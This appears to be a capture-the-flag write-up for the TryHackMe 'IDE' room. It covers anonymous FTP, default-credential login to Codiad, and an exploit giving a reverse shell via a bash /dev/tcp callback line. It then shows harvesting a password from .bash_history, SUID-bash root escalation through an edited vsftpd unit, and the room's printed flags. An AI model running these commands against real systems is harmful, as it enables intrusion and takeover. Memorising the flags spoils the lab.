# TryHackMe --- IDE

![Difficulty](https://img.shields.io/badge/Difficulty-Easy-brightgreen)
![Platform](https://img.shields.io/badge/Platform-TryHackMe-red)
![Focus](https://img.shields.io/badge/Focus-Web%20Exploitation%20%7C%20Linux%20Privilege%20Escalation-blue)

## Overview

This write-up documents my approach to the **IDE** room on TryHackMe. The attack path starts with anonymous FTP access, uses information discovered in an FTP note to access a Codiad instance, obtains a shell as `www-data`, pivots to the `drac` user, and then escalates privileges to root through a misconfigured service-management path.


## Objectives

-   Enumerate exposed services and discover the web application.
-   Identify credentials disclosed through FTP.
-   Obtain an initial shell through the Codiad application.
-   Recover the user flag.
-   Escalate privileges and recover the root flag.

## Attack chain

``` text
Nmap enumeration
      |
      v
Anonymous FTP (port 21)
      |
      v
Retrieve note containing default-password hint
      |
      v
Discover Codiad on port 62337
      |
      v
Authenticate as john / password
      |
      v
Exploit Codiad -> shell as www-data
      |
      v
Read drac's .bash_history -> recover password
      |
      v
SSH as drac -> user flag
      |
      v
Abuse vsftpd service configuration/restart path
      |
      v
SUID bash (bash -p) -> root flag
```

## 1. Reconnaissance

Start with a service/version scan and default scripts.

``` bash
nmap -sV -sC <TARGET_IP>
```

The scan identifies these services:

      Port Service   Finding
  -------- --------- ---------------------------------------
    21/tcp FTP       vsftpd 3.0.3; anonymous login allowed
    22/tcp SSH       OpenSSH 7.6p1 on Ubuntu
    80/tcp HTTP      Apache httpd 2.4.29 on Ubuntu

<img width="758" height="559" alt="1" src="https://github.com/user-attachments/assets/9233bc4b-34c2-4533-a803-c1379d21265d" />

Run a full TCP port scan to discover services on non-standard ports.

``` bash
nmap -p- <TARGET_IP>
```

The scan reveals an additional web service on port `62337`.

<img width="322" height="200" alt="6" src="https://github.com/user-attachments/assets/8699e986-f8c9-42e9-a5ca-dd2f433f5284" />

## 2. Enumerate anonymous FTP

Connect to FTP and log in with the username `Anonymous`.

``` bash
ftp <TARGET_IP>
```

At the prompt, enter:

``` text
Name: Anonymous
Password: [press Enter if prompted]
```

List the available files and directories.

``` text
ls -la
cd ..
```

<img width="405" height="167" alt="2" src="https://github.com/user-attachments/assets/ee8bd0ac-22ae-4668-a850-8e428227ce37" />
<img width="530" height="401" alt="3" src="https://github.com/user-attachments/assets/1083ba49-0b0f-4e04-a929-49c9ede3f92a" />

Download the note shown in the FTP directory. In the recorded session,
the file is retrieved with:

``` text
get -
```

<img width="417" height="140" alt="4" src="https://github.com/user-attachments/assets/0727daaf-f440-4ec9-b9d3-52d28d7178a6" />

Read the downloaded file locally:

``` bash
cat ftp.txt
```

The note says:

``` text
Hey john,
I have reset the password as you have asked. Please use the default password to login.
Also, please take care of the image file.
- drac.
```

This suggests trying the default password for the `john` account on the
web application.

<img width="709" height="232" alt="5" src="https://github.com/user-attachments/assets/b1ac0933-ca06-492f-92b6-926775c8485c" />

## 3. Discover the Codiad instance

Open the service discovered on port `62337`:

``` text
http://<TARGET_IP>:62337
```

The page presents a Codiad login screen.

<img width="621" height="511" alt="7" src="https://github.com/user-attachments/assets/7316cc62-5682-40dc-a8fd-b0084fa0672c" />

Try the credentials suggested by the FTP note:

``` text
Username: john
Password: password
```

<img width="382" height="180" alt="7-2" src="https://github.com/user-attachments/assets/ec4cc21a-8bcc-44f4-8966-21b32ed25d01" />

After logging in, inspect the application and its source/version information. The screenshots identify the application as **Codiad 2.8.4**.

<img width="1046" height="660" alt="8" src="https://github.com/user-attachments/assets/9737db88-6848-4243-9b88-a893babdfe29" />
<img width="209" height="55" alt="9" src="https://github.com/user-attachments/assets/99075f45-e1fc-483b-80e9-847e51d0edba" />


## 4. Exploit Codiad to obtain an initial shell

The screenshots show an exploit script being used against the Codiad instance. Update the target IP and callback IP/ports to match your lab VPN environment before running it.

``` bash
python2 exploit.py http://<TARGET_IP>:62337/ john password <YOUR_TUN0_IP> 4444 linux
```

The exploit output instructs you to start listeners on ports `4444` and
`4445`. In the recorded session, the first listener is started with:

``` bash
nc -lnvp 4444
```

The callback command shown by the exploit is:

``` bash
echo 'bash -c "bash -i >/dev/tcp/<YOUR_TUN0_IP>/4445 0>&1 2>&1"' | nc -lnvp 4444
```

In a second terminal, start the callback listener:

``` bash
nc -lnvp 4445
```

Follow the exploit's prompt to send the payload. The screenshots show a connection from the target and a shell running as `www-data` in the Codiad file-manager directory.

<img width="916" height="246" alt="10-1" src="https://github.com/user-attachments/assets/eb94c78d-041a-4005-a7da-ecc7a0b66375" />
<img width="700" height="107" alt="10-2" src="https://github.com/user-attachments/assets/1d2b9c68-a63c-4775-ad1b-865be8bb2e04" />
<img width="649" height="160" alt="10-3" src="https://github.com/user-attachments/assets/5793dc6b-ffe6-4260-840a-9465dbaca9a5" />


## 5. Find the `drac` user's files

From the initial shell, inspect `/home`:

``` bash
cd /home
ls
```

The home directory for `drac` is present. Inspect it:

``` bash
cd drac
ls
```

The directory contains `user.txt`, but the current `www-data` account
cannot read it.

``` bash
cat user.txt
```

The command returns `Permission denied`.

<img width="567" height="165" alt="11" src="https://github.com/user-attachments/assets/003314e3-1b2a-4b3e-9069-f39ff50392c7" />
<img width="571" height="329" alt="12" src="https://github.com/user-attachments/assets/be17eeaa-0205-41e9-bce1-cc9aa7577ed0" />

## 6. Recover credentials from shell history

Inspect the user's shell history file:

``` bash
cat .bash_history
```

The history contains a MySQL command with a password:

``` text
mysql -u drac -p 'Th3dRaCULa1sR3aL'
```

This reveals a password that can be tested for the `drac` account in the context of the lab.

<img width="362" height="67" alt="13" src="https://github.com/user-attachments/assets/105df324-da15-4a78-b4f7-e86ffe99ca3b" />

## 7. SSH as `drac` and retrieve the user flag

Connect over SSH:

``` bash
ssh drac@<TARGET_IP>
```

Use the password recovered from `.bash_history` when prompted.

<img width="685" height="563" alt="14" src="https://github.com/user-attachments/assets/e7860da4-ba0b-48a9-9a1f-adcda5e32736" />

After logging in, read the user flag:

``` bash
cat user.txt
```

**User flag:**

``` text
02930d21a8eb009f6d26361b2d24a466
```

<img width="291" height="103" alt="15" src="https://github.com/user-attachments/assets/919ae5a0-9e60-423a-a173-38cf427c2318" />

## 8. Check sudo permissions

Check which commands `drac` can run with elevated privileges:

``` bash
sudo -l
```

The output shows permission to run the following command as root:

``` text
/usr/sbin/service vsftpd restart
```

<img width="956" height="129" alt="16" src="https://github.com/user-attachments/assets/66d9e287-620d-47b2-9c01-062f026f0e37" />

## 9. Abuse the vsftpd service restart path

The screenshots show the vsftpd systemd unit being located:

``` bash
locate vsftpd.service
```

The unit path shown is:

``` text
/lib/systemd/system/vsftpd.service
```

<img width="682" height="196" alt="18" src="https://github.com/user-attachments/assets/2de50703-37b9-46cc-8a5a-8133c46598f2" />

The unit file shown in the screenshots has its `ExecStart` changed to:

``` ini
ExecStart=/bin/chmod 4777 /bin/bash
```

This command sets the SUID bit on `/bin/bash` when the service starts. The screenshots show the unit file being edited and the service manager being asked to reload unit definitions.

<img width="824" height="267" alt="19" src="https://github.com/user-attachments/assets/c8688056-1985-489a-9d00-56f999913197" />

Reload the systemd unit definitions if the file has changed, then
restart the service using the allowed sudo command:

``` bash
sudo systemctl daemon-reload
sudo /usr/sbin/service vsftpd restart
```

The recorded terminal shows the service restart and a search for SUID
files:

``` bash
find / -perm -4000 2>/dev/null
```

<img width="1156" height="150" alt="20" src="https://github.com/user-attachments/assets/305d5cd6-47e3-403c-95f5-4743121822db" />
<img width="428" height="424" alt="21" src="https://github.com/user-attachments/assets/5b83b1ec-0e90-4fe3-8465-e71f22e4ddf2" />

> **Important detail:** The screenshots document the service-unit modification and restart sequence. Do not assume that permission to restart a service normally grants permission to edit its unit file; that depends on the target's actual file permissions and configuration.

## 10. Escalate to root

With the SUID bit set on Bash, launch a privileged Bash shell:

``` bash
bash -p
```

Verify the effective identity:

``` bash
id
```

The screenshot shows `euid=0(root)`, confirming effective root privileges.

<img width="807" height="88" alt="22" src="https://github.com/user-attachments/assets/3ef00b4e-0158-42cc-80ee-2fbcf6eb5d20" />
Read the root flag:

``` bash
cat /root/root.txt
```

**Root flag:**

``` text
ce258cb16f47f1c66f0b0b77f4e0fb8d
```

<img width="293" height="53" alt="23" src="https://github.com/user-attachments/assets/c5628f10-9fd3-4f9d-9f79-43598d4cdbd7" />

